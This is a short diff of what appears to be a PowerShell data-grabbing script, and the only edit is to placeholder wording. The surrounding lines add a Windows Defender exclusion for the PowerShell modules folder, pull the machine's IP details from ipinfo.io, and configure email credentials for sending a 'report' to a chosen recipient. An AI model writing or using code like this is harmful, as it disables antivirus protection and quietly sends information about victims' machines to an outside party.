@@ -9,9 +9,9 @@ Add-MpPreference -ExclusionPath "$env:USERPROFILE\Documents\WindowsPowershell\Mo
 $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
 
   
-    $recipient = "Recipient Email Address here Exam: Hajus11@somthing.com"
-    $sende = "Sender Email Address Here Exam: Mustafa@gmail.com"
-    $usr = "Actual email address  that you want to use to send the email report Exam: Mustafa@gmail.com"
+    $recipient = "Recipient Email Address here Example: Hajus11@somthing.com"
+    $sende = "Sender Email Address Here Example: Mustafa@gmail.com"
+    $usr = "Actual email address  that you want to use to send the email report Example: Mustafa@gmail.com"
     $passwd = "Here actual  password that you want to use to send the email report"
     
     $securePasswd = ConvertTo-SecureString $passwd -AsPlainText -Force
